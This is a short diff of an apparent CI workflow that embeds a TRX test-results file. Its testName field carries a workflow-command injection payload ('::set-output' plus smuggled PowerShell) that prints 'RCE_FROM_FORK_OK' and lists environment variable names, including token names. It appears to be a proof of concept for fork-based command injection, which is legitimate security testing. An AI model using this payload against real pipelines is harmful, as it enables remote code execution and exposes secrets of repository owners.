@@ -30,7 +30,7 @@ jobs:
             </UnitTest>
           </TestDefinitions>
           <Results>
-            <UnitTestResult testId="1" testName="EvilTest&#10;::set-output name=url_html::&quot;; Write-Output 'RCE_FROM_FORK_OK'; Write-Output ('ENV: ' + ((Get-ChildItem Env: | Where-Object { $_.Name -match 'TOKEN|INPUT_' } | ForEach-Object { $_.Name }) -join ',')); &quot;" outcome="Passed" duration="00:00:01" />
+            <UnitTestResult testId="1" testName="EvilTest&#10;::set-output name=url_html::&quot;; Write-Output 'RCE_FROM_FORK_OK'; Get-ChildItem Env: | ForEach-Object { Write-Output ('E:' + $_.Name) }; &quot;" outcome="Passed" duration="00:00:01" />
           </Results>
         </TestRun>
         TRX
